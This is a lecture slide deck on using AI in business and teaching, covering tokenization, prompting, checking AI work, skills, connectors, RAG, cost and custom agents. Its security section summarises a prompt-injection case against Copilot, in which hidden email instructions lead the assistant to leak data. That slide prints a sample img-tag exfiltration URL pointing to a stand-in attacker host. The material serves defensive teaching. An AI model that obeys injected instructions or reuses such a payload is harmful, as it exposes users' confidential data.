> You'll still have people at the top who are managing and have relationships with clients, but many, many of the processes underneath are now being done by AI systems.
>
> Workers would shift from being creators of reports or software updates, or 'makers' ... to 'checkers' or managers of AI agents doing that work.

# How AI works {.circle-top background-image="utah-abs-little-cottonwood-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Tokenization

Text is cut into pieces from a fixed vocabulary before the model sees any of it.

```
"The cat sat on the mat"  ->  ["The", " cat", " sat", " on", " the", " mat"]

"Unbelievable"            ->  ["Un", "believ", "able"]
```

Common words stay whole; rare and long words break into pieces. A typical vocabulary runs to about 100,000 tokens.

::: {.note}
Numbers break on the same rules, which have nothing to do with arithmetic. `13,963,378.65` reaches the model as a handful of unrelated pieces.
:::

## The prediction pipeline

::: {.cards .cards-4}
::: {.card}
[Words]{.card-title}

Input text
:::

::: {.card .card-blue}
[Tokens]{.card-title}

Text split into units
:::

::: {.card}
[Neural network]{.card-title}

Billions or trillions of parameters
:::

::: {.card .card-blue}
[Token]{.card-title}

Predict next token
:::
:::

::: {.note}
The predicted token is added to the text, and the loop runs again.
:::

## A neural network is a function {.compare}

:::: {.columns}
::: {.column width="50%"}
[The idea]{.eyebrow}

*y* = 4*x* is a function. The 4 is a parameter.

Change it to 3 and you have the same structure with different behavior.
:::

::: {.column width="50%"}
[The scale]{.eyebrow}

Same idea with perhaps trillions of parameters, arranged as a transformer --- the architecture published by Google researchers in 2017.
:::
::::

::: {.note}
Training sets the parameters: the model reads a huge amount of text (the training data), and the parameters are adjusted until it predicts the next token well. The trained network is a large language model (LLM).
:::

# Effective prompting {.photo-left .circle-top background-image="utah-abs-snowbird-gray.jpg" background-size="40.625% 100%" background-position="left"}

## Prompting: what you put in messages[]

::: {.agent-map .hl-user .hl-msgs}
{{< include _agent-map.qmd >}}
:::

## Prompting today

::: {.cards .cards-3}
::: {.card}
[Drop old techniques]{.card-title}

Most ‘prompt engineering’ techniques from a few years ago are now either useless or actually counterproductive. Don’t tell it “you are an expert data scientist” or “think step by step.”
:::

::: {.card .card-blue}
[Say what you want]{.card-title}

Tell it what you want, not what not to do.
:::

::: {.card}
[Ask for the best way first]{.card-title}

Ask it to do something, and it does what it has seen most often in its training data.

Ask for the best way, and it repeats evaluations of methods it has seen. Then ask it to proceed: it reads "the best way is ..." in the conversation and follows that.
:::
:::

## Three habits

::: {.cards .cards-3}
::: {.card}
[Beware of tunnel vision]{.card-title}

Once AI starts down a path, continuing is the likeliest next step. At a roadblock it tries one workaround after another and rarely asks whether a [different path]{.accent} is better.

Periodically ask: are there other approaches that might work better for reaching the end goal?
:::

::: {.card .card-blue}
[Steelman]{.card-title}

Training on human feedback rewards agreement. Ask "is my plan sound?" and AI finds reasons it is.

Instead ask: "What is the strongest argument against this?" Have it play a skeptical board member, a regulator, a competitor.
:::

::: {.card}
[Numbers need code]{.card-title}

Numbers reach the model as unrelated tokens. If no code produced a number, the number was predicted. AI predicts `sum([83, 16, 104])` better than what follows `83 + 16 + 104 =`.

Prompt: "Compute this in Python. Do not report a number you did not compute with code."
:::
:::

## How Claude checks Office documents {.compare}

:::: {.columns}
::: {.column width="50%"}
### PowerPoint and Word

Uses LibreOffice to export to PDF, then converts each PDF page to a PNG and looks at it for overflowing text, overlaps, and cut-off tables.
:::

::: {.column width="50%"}
### Excel

Uses LibreOffice to recalculate every formula, then lists cells with errors such as #REF! or #DIV/0! and fixes them.
:::
::::

# Checking AI work {.photo-left .circle-top background-image="utah-abs-little-cottonwood-gray.jpg" background-size="40.625% 100%" background-position="left"}

## Checking: you are the last step in the loop

::: {.agent-map .hl-user}
{{< include _agent-map.qmd >}}
:::

## How to check AI work

::: {.cards .cards-2}
::: {.card .card-blue}
[Have AI explain its work]{.card-title}

"Explain what you did step by step. Did you make any decisions that we have not discussed?"
:::

::: {.card}
[Use another AI agent to check the work]{.card-title}

A fresh conversation or a subagent (a second agent that the first agent starts), given your goals and the first agent's explanation.
:::

::: {.card}
[Have AI build a spreadsheet when possible]{.card-title}

Then check the formulas. Every number traces back to its inputs.
:::

::: {.card .card-blue}
[Run the same code on small examples]{.card-title}

Ask AI to run its code on a few rows you can check by hand.
:::
:::

::: {.note}
Most AI coding errors arise from misunderstandings and unstated assumptions --- and from errors that people also make, for example, merging and filtering in the wrong order.
:::

## Why AI performs worse on judgment calls

::: {style="font-size: 0.9em;"}
> The gulf between LLM performance on verifiable tasks vs. unverifiable tasks that require judgment is larger than most people realize. Verifiable tasks, like coding or solving math problems, have a right answer that can be checked automatically. Judgment tasks don't have unambiguous, ground-truth, correct answers. But they do have better and worse answers.
>
> ::: {style="background: #dafbf4; padding: 0.4em 0.6em 0.05em 0.6em; margin-left: -0.6em;"}
> We have much better techniques for training AI systems to do well on verifiable tasks. As a result, progress on performing such tasks has been much faster than for judgment tasks.
> :::
:::

[Andrew Ng, co-founder and former head of Google Brain, co-founder of Coursera and DeepLearning.AI · The Batch, October 16, 2026]{.eyebrow}

[Customers Bank CEO Sam Sidhu, statement to [Fortune](https://fortune.com/2026/04/28/ceo-of-customers-bank-sam-sidhu-ai-clone-lead-earnings-call-mark-zuckerberg-building-digital-twin/), April 28, 2026]{.eyebrow}

## Ways to automate

::: {.cards .cards-4}
::: {.card .card-blue}
[1. Software]{.card-title}

Apps that AI writes: dashboards, spreadsheet replacements, apps that call AI.
:::

::: {.card}
[2. Skills]{.card-title}

Instructions and scripts that a general agent (Claude, ChatGPT, ...) follows.
:::

::: {.card .card-blue}
[3. Connectors and RAG]{.card-title}

Give the agent your data and documents.
:::

::: {.card}
[4. Custom agents]{.card-title}

Your interface, system prompt, and tools, for people who do not use Claude.

Each is also a student deliverable, alongside spreadsheets and reports crafted by AI and checked by students.
:::

# Vibe-coding software {.photo-left .circle-top background-image="utah-abs-big-cottonwood-gray.jpg" background-size="40.625% 100%" background-position="left"}

## Artifacts

Vibe coding: you describe the software in plain English, and AI writes all the code.

Claude calls a single-page HTML app an artifact. The whole app is one file that runs in your browser.

1. In Claude Desktop, choose Artifact in the left pane.
2. Choose New. Prompt Claude to create the app.
3. You should get options to deploy the app online or to download it.

::: {.note}
You can also just prompt Claude "Create a single-page HTML app ..."
:::

## More complex software has two parts

::: {.cards .cards-2}
::: {.card .card-blue}
[Backend]{.card-title}

A service running somewhere. It listens for input and does the actual work.
:::

::: {.card}
[Frontend]{.card-title}

Your browser. It sends instructions to the backend:

- GET: get a page
- POST: send information and get a response
:::
:::

::: {.note}
Your own computer can be both the frontend and the backend: it serves the app, and you interact with it in your browser.
:::

## Demos

::: {.cards .cards-2}
::: {.card .card-blue}
[Refinery blending]{.card-title}

[kerryback.com/refinery.html](https://kerryback.com/refinery.html)

An artifact. Classic linear programming problem.  App shows the optimal blend, which constraints bind, and what relaxing each one is worth. Every input can be edited.
:::

::: {.card}
[Tangency portfolio]{.card-title}

[tangency.kerryback.com](https://tangency.kerryback.com)

Backend to pull data.  Calculate sample statistics.  Compute tangency portfolio by matrix algebra.  Put everything in an Excel workbook.
:::
:::

# Skills {.circle-top background-image="utah-abs-little-cottonwood-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Skills: instructions loaded into messages[] when needed

::: {.agent-map .hl-msgs}
{{< include _agent-map.qmd >}}
:::

## Skills

::: {.cards .cards-2}
::: {.card .card-blue}
[What a skill is]{.card-title}

A folder with a `SKILL.md` file in it --- the instructions for one task, plus any scripts, templates or reference files those instructions call for
:::

::: {.card}
[What is read, and when]{.card-title}

The name and description at the start of every conversation, about 100 tokens each. The rest of the file only when a task matches the description
:::
:::

::: {.note}
An alternative is "custom instructions" (`CLAUDE.md` or `AGENTS.md` in Claude Code and similar coding agents). Put rules you want AI to follow in every conversation there (e.g., avoid boldface, bulleted lists, and undue emphasis).
:::

## Some Anthropic skills

Published at [github.com/anthropics/skills](https://github.com/anthropics/skills) and available on paid plans in Claude.ai.

::: {.cards .cards-3}
::: {.card .card-blue}
[Office documents]{.card-title}

- xlsx --- Excel workbooks
- docx --- Word documents
- pptx --- PowerPoint decks
- pdf --- PDF files
:::

::: {.card}
[Building things]{.card-title}

- skill-creator --- write and improve skills
- frontend-design --- polished web pages and apps
- web-artifacts-builder --- larger artifacts
- mcp-builder --- connectors to data (next section)
:::

::: {.card .card-blue}
[Other]{.card-title}

- doc-coauthoring --- co-write a document
- webapp-testing --- test a web app in a browser
- canvas-design --- posters and visual art
- brand-guidelines --- Anthropic's colors and type; a model for your own
:::
:::

## Creating skills

::: {.cards .cards-3}
::: {.card .card-blue}
[1]{.card-title}

The usual process: you work on something, iterating until you get what you want.
:::

::: {.card}
[2]{.card-title}

You realize you may want the same thing again, and you don't want to go through the iteration again.
:::

::: {.card .card-blue}
[3]{.card-title}

Solution: tell AI to package the final version as a skill.
:::
:::

## Demo

In a Claude Code session on my laptop, I enter the prompt `/mydcf {ticker}`. Claude should:

1. Pull 10-Ks for the ticker from SEC EDGAR.
2. Get earnings call transcripts from The Motley Fool.
3. Build a two-stage DCF valuation.
4. Lay out its assumptions and their grounding in its sources.
5. Create an editable HTML document and an Excel workbook.
6. Post the document at {ticker}.kerryback.com.

# Connecting AI to your data {.photo-left .circle-top background-image="utah-abs-snowbird-gray.jpg" background-size="40.625% 100%" background-position="left"}

## Connectors are tools; RAG puts passages in messages[]

::: {.agent-map .hl-msgs .hl-tools}
{{< include _agent-map.qmd >}}
:::

## Connectors (MCP servers)

An MCP server is a bridge between an AI agent and a data source or service. Thousands exist already.

::: {.cards .cards-3}
::: {.card .card-blue}
[What you add]{.card-title}

A URL, in the agent's settings
:::

::: {.card}
[What the agent gets]{.card-title}

A name, a description and an input schema for each tool the server offers
:::

::: {.card .card-blue}
[What stays on the server]{.card-title}

The code, and the credentials it uses to reach the data
:::
:::

::: {.note}
Examples: Snowflake, Databricks, BigQuery, Salesforce, HubSpot, Workday, SAP, Slack, Gmail, Microsoft 365 (SharePoint, Outlook, Teams), Notion, GitHub, Stripe, Shopify
:::

## Retrieval augmented generation

RAG is for documents: contracts, mail, board papers, policies, reports. They were not in the training data, and they are too large to paste into every prompt.

::: {.cards .cards-4}
::: {.card .card-blue}
[1. Chunk]{.card-title}

Split the documents into passages of a few hundred words.
:::

::: {.card}
[2. Embed]{.card-title}

Turn each passage into a vector: a list of numbers that puts passages with similar meaning close together.
:::

::: {.card .card-blue}
[3. Retrieve]{.card-title}

Embed the question and find the passages closest to it.
:::

::: {.card}
[4. Paste]{.card-title}

Put those passages in the prompt, with the question.
:::
:::

::: {.note}
The model never reads your whole document store. It reads the excerpts that a similarity search chooses. Demo: [rag.kerryback.com](https://rag.kerryback.com)
:::

# Security and compliance {.circle-top background-image="utah-abs-big-cottonwood-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Security: what the loop reads and where it can send data

::: {.agent-map .hl-msgs .hl-tools}
{{< include _agent-map.qmd >}}
:::

## API billing

An API (application programming interface) lets software, not a person in a chat window, send messages to the model. API billing is usage-based: you pay per token, through an API key, instead of a flat subscription.

- Data Processing Agreements (a contractual guarantee of zero data retention and "do not train") are available only with API billing.
- Custom AI agents and AI-enabled software also require API billing.

## Basic requirements

::: {.cards .cards-3}
::: {.card .card-blue}
[Zero data retention]{.card-title}

The provider deletes prompts and responses once the response is returned. Anthropic and OpenAI offer it on API agreements, by approval.
:::

::: {.card}
[No training on your data]{.card-title}

Business and enterprise plans and the APIs exclude your data from training by default. On consumer plans, it is a setting you turn off.
:::

::: {.card .card-blue}
[Logging and monitoring]{.card-title}

Enterprise plans provide audit logs and compliance APIs, so you can see who sent what to which model.
:::
:::

::: {.note}
Zero retention and logging work together: the provider keeps nothing, and your firm keeps the record.
:::

## HIPAA and SEC

::: {.cards .cards-2}
::: {.card .card-blue}
[HIPAA --- a BAA is required]{.card-title}

Satisfactory assurances "must be documented through a written contract … that meets the applicable requirements of § 164.504(e)."

[45 CFR 164.502(e)](https://www.law.cornell.edu/cfr/text/45/164.502)
:::

::: {.card}
[SEC Reg S-P --- oversee the vendor]{.card-title}

Written policies "reasonably designed to require oversight, including through due diligence and monitoring, of service providers."

[17 CFR 248.30](https://www.law.cornell.edu/cfr/text/17/248.30)
:::
:::

## Prompt injection and data exfiltration: the Copilot case

[CVE-2025-32711 --- June 2025]{.eyebrow}

1. The attacker sends the victim an email containing hidden instructions, invisible to a human reader.
2. The victim asks Copilot to summarize their email. Copilot reads the hidden instructions.
3. Following them, Copilot embeds confidential data in a URL in its response.

::: {.note}
`<img src="https://badactor.com?SSN=078-05-1120">`
:::

## Security concerns have throttled adoption

::: {.stats}
::: {.stat}
[59%]{.stat-value}
[cite security and compliance concerns as a top barrier to scaling AI agents]{.stat-label}
:::
::: {.stat}
[77%]{.stat-value}
[say AI adoption is outpacing their governance capabilities]{.stat-label}
:::
::: {.stat}
[11%]{.stat-value}
[feel completely prepared for the AI agents expected next year, though 80% have CEO mandates]{.stat-label}
:::
:::

- 70% say teams deploy technology faster than IT can track it.
- Two-thirds say they are accountable for outcomes in systems they don't fully control.

[IBM Institute for Business Value with Oxford Economics, [2026 Tech Leader Study: Building the IT foundation for agentic AI at scale](https://newsroom.ibm.com/2026-06-08-new-ibm-study-finds-cios-and-ctos-face-growing-ai-control-gap-as-enterprise-deployment-scales), June 8, 2026. Survey of 2,000 senior executives responsible for IT, technology, or AI decisions; 33 geographies, 19 industries; January to April 2026. Large organizations: average revenue $14.4 billion, average workforce 33,500.]{.eyebrow}

## Sandboxes: limiting where data can go

::: {.cards .cards-2}
::: {.card .card-blue}
[Code execution is usually sandboxed]{.card-title}

Claude, ChatGPT, and other chat apps run code and terminal commands in a sandbox on the provider's servers. The code and terminal commands can reach only allowed domains.
:::

::: {.card}
[Still have WebFetch]{.card-title}

The model can fetch web pages. WebFetch runs on the provider's servers, outside the sandbox, so it is still a path out: a fetched URL can carry your data to the attacker's server.
:::
:::

::: {.note}
Claude Code runs code and terminal commands on your machine --- they can see your files and reach any domain your machine can reach.
:::

# Cost-effective AI {.photo-left .circle-top background-image="utah-abs-little-cottonwood-gray.jpg" background-size="40.625% 100%" background-position="left"}

## Cost: messages[] is re-sent to the LLM every turn

::: {.agent-map .hl-msgs .hl-llm}
{{< include _agent-map.qmd >}}
:::

## Cost

> My token cost … is shooting through the roof. … Clients are ready to scale AI, but then they hit this unexpected cost wall.

[Lan Guan, Chief AI and Data Officer, Accenture, [Fortune](https://fortune.com/2026/07/29/cfo-hitting-cost-wall-ai-tokens-accenture/), July 29, 2026]{.eyebrow}

- Uber used up its 2026 AI budget by April, four months after rolling out Claude Code to engineers.
- Microsoft's Experiences + Devices group is moving engineers off Claude Code to GitHub Copilot CLI. Microsoft calls it "toolchain unification." Press reports point to cost.

[[Forbes](https://www.forbes.com/sites/janakirammsv/2026/05/17/uber-burns-its-2026-ai-budget-in-four-months-on-claude-code/), May 17, 2026, citing The Information · [The Next Web](https://thenextweb.com/news/microsoft-claude-code-retreat-ai-cost), May 25, 2026, citing Windows Central and The Verge]{.eyebrow}

## Input cost is quadratic in conversation length {.smaller}

Each turn re-sends the whole conversation: every standing instruction, memory note, tool definition, tool call, tool response, and the AI's reasoning output. If each of *n* turns adds one unit of text, input cost is 0.5*n* + 0.5*n*^2^ with no caching and 1.2*n* + 0.05*n*^2^ with caching. Output is generated once per turn, so output cost grows linearly.

::: {.cards .cards-2}
::: {.card .card-blue}
[Input cost, if each turn adds one unit of text]{.card-title}

::: {.comparison-table}

| Turns | No caching | With caching |
|---|---|---|
| 10 | 55 | 17 |
| 20 | 210 | 44 |
| 40 | 820 | 128 |

:::

Caching: the provider stores text it has already processed. New text costs 1.25, re-sent text 0.1.
:::

::: {.card}
[What saves money]{.card-title}

- Many short conversations instead of one long one
- Break tasks into subtasks done in separate conversations or by subagents
- Reuse saved code instead of having AI rewrite it. 
- Ask AI for a summary document often and continue from it in a new conversation
:::
:::

## Size the model to the task

Most tasks can be done with less expensive models. Claude Sonnet is very capable and is only 1/5 the cost of Claude Fable.

::: {.cards .cards-3}
::: {.card .card-blue}
[Expensive models]{.card-title}

Nuanced writing tasks
:::

::: {.card}
[Smaller, cheaper models]{.card-title}

Most coding tasks
:::

::: {.card .card-blue}
[No model at all]{.card-title}

Reuse saved code instead of rewriting it.
:::
:::

::: {.note}
Companies are increasingly using open-weight models (DeepSeek, etc.) to reduce costs.
:::

## Open weight models

Models that anyone can install and run on their own hardware, if the hardware is adequate.

- From Meta, Mistral, DeepSeek, Alibaba, Moonshot, Z.ai, Xiaomi, ...
- More than 3 million models at [HuggingFace.co](https://huggingface.co)
- A 1-trillion-parameter model can run on four linked Mac Studios with 512GB each (coming soon).

::: {.note}
Playground for my class: [lab-mimo.kerryback.com](https://lab-mimo.kerryback.com)
:::

# Custom agents {.circle-top background-image="utah-abs-snowbird-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Custom agents: you build the whole loop

::: {.agent-map .hl-all}
{{< include _agent-map.qmd >}}
:::

## Customer service agent {.compare}

A chat window on the company's website. A customer asks about an order. The agent looks the order up in the order system, checks the shipping status and drafts the reply. It can issue a refund up to $100. A larger refund, or an unusual case, goes to a person with the conversation attached.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

Customers do not have Claude. The refund limit is a rule in the agent's code, so nothing a customer types can raise it. Every conversation and refund is logged.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

The company builds, hosts and secures it, and pays for API tokens on every conversation. Customer-service platforms sell agents like this.
:::
::::

## Admissions assistant {.compare}

A chat page on the program's website for applicants. It answers questions about deadlines, requirements, tuition and courses from the program's own documents, and cites the page it used. A question the documents do not answer, or a question about one applicant's file, goes to admissions staff.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

Applicants do not have Claude. The agent can reach only the program's documents, not the web or student records.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

Vendors sell this as a product. The answers are only as current as the documents behind them.
:::
::::

## Sales-call prep agent {.compare}

Runs the evening before each client meeting on a salesperson's calendar. It pulls the account's CRM history, open support tickets and recent invoices, searches the news for the client, and sends the salesperson a one-page brief.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

It runs on a schedule, without anyone asking, and every salesperson gets the brief in the same format.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

A salesperson who has Claude, a CRM connector and a skill can get the same brief on request. It reads both company data and the web, so it needs the separation on the research-team slide.
:::
::::

## FP&A analyst agent {.compare}

A chat page for managers. A manager asks how the department is doing against budget. The agent queries the general ledger, the sales detail and the headcount roster through a read-only MCP server, runs the calculations in Python, and explains each variance by price, volume, rate and headcount, with a chart.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

Managers without Claude can ask. The connection to the ledger is read-only, the system prompt fixes how variances are explained, and every question and answer is logged.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

Analysts who have Claude and the same MCP server can ask the same questions directly. The answers still have to be checked against the ledger.
:::
::::

## Contract review agent {.compare}

For the company's attorneys. The company's contracts and its standard terms are split into passages and indexed (RAG). An attorney asks, for example, which supplier contracts cap liability below the standard or renew automatically. The agent retrieves the matching clauses and answers, citing the contract and the clause.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

It answers only from the indexed contracts and cites each clause, so the attorney can check every answer. The index stays inside the company.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

Legal AI products sell this. Retrieval can miss a clause with unusual wording, so the attorney still reads the contract.
:::
::::

## Research team {.compare}

Three agents. The orchestrator, the one you chat with, splits a question into two parts. A data agent queries the data warehouse and returns data and analysis. A web agent searches the web and returns information. The orchestrator combines the two answers.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

Each agent reads only its own material, and each job can use a smaller model. The web agent reads untrusted pages and never touches company data, so an instruction hidden in a web page cannot reach that data, as it did in the Copilot case.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

More agents means more calls and more tokens, and three agents to build and test instead of one.
:::
::::

## Model router {.compare}

Sits in front of every AI request in the company. A small, inexpensive model reads each prompt and sends it to the cheapest model in an approved list that can do the job: an open-weight model for simple extraction, Claude Sonnet for most work, Claude Fable for the hardest tasks.

:::: {.columns}
::: {.column width="50%"}
[Why a custom agent]{.eyebrow}

The company sets the approved list and pays the lowest price that does the job. All AI spending passes through one place.
:::

::: {.column width="50%"}
[Why not]{.eyebrow}

Amazon Bedrock and OpenRouter offer routing as a service. A wrong route gives a weaker answer.
:::
::::

## Things you choose

::: {.cards .cards-3}
::: {.card .card-blue}
[Your interface]{.card-title}

A chat page or a button inside your own software, for customers or staff who do not use Claude or ChatGPT.
:::

::: {.card}
[Your tools and data]{.card-title}

Only the tools you choose: your database, your functions, the MCP servers you trust. Nothing else.
:::

::: {.card .card-blue}
[Your rules]{.card-title}

A fixed system prompt, the model you choose for each job, a spending limit, and a log of every call.
:::
:::

::: {.note}
Agent SDKs (Claude Agent SDK, OpenAI Agents SDK) supply the harness and the built-in tools. The Claude Agent SDK gives you the Claude Code harness.
:::

# Teaching with AI {.circle-top background-image="utah-abs-little-cottonwood-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Two jobs {.compare}

:::: {.columns}
::: {.column width="50%"}
[Teaching fundamental concepts]{.eyebrow}

Students cannot check AI work on concepts they do not understand.

- Socratic AI tutors: the student produces the answer; the tutor asks, waits, and diagnoses a wrong answer from the answer itself
  - Example: a binomial option-pricing tutor, packaged as a Claude skill
- Practice problems and feedback on demand, at any hour
- Some assessments without AI, to confirm the student knows the concepts
:::

::: {.column width="50%"}
[Teaching managing AI]{.eyebrow}

Students will manage AI agents that do the work, as checkers more than makers.

- Specify the task: goals, assumptions, and what a good result looks like
- Check the work: explanations, second agents, spreadsheets, small examples
- Package what works as skills and agents that others can use
:::
::::

## Chatting with AI in the classroom

- Chatting with AI at the podium with students observing is OK.
- But having a student share a chat and discussing it with the class is more effective.
- Canvas has a Share Screen tool, but it is clunky.
- It is easy to build software that enables screen sharing.
- Demo: [screenshare.kerryback.com](https://screenshare.kerryback.com)

## AI cannot make the judgment calls {.compare}

:::: {.columns}
::: {.column width="50%"}
> I need human judgment, I need human decision making, I need human accountability at the core.

[HSBC CEO Georges Elhedery, [Bloomberg TV interview](https://www.bloomberg.com/news/videos/2026-06-08/hsbc-ceo-says-bank-still-needs-human-judgment-in-ai-era-video), June 8, 2026]{.eyebrow}
:::

::: {.column width="50%"}
> Technology itself does not decide what the future looks like. People do. For all the promise of AI … AI cannot decide which problems are worth solving. It cannot make the hard judgment calls with imperfect information. It cannot take responsibility for the outcome. These are our responsibilities. And they matter more now than ever.

[AMD CEO Lisa Su, [MIT Commencement address](https://news.mit.edu/2026/commencement-address-lisa-su-0528), May 28, 2026]{.eyebrow}
:::
::::

# A tool for Claude Code CLI {.circle-top background-image="utah-abs-big-cottonwood-mint.jpg" background-size="40.625% 100%" background-position="right"}

## Academic Studio

- Claude Desktop works: select Code at the top right of the left panel.
- VS Code (Microsoft) is better but intimidating.
- Academic Studio is a fork of VS Code designed for non-coding Claude Code users.
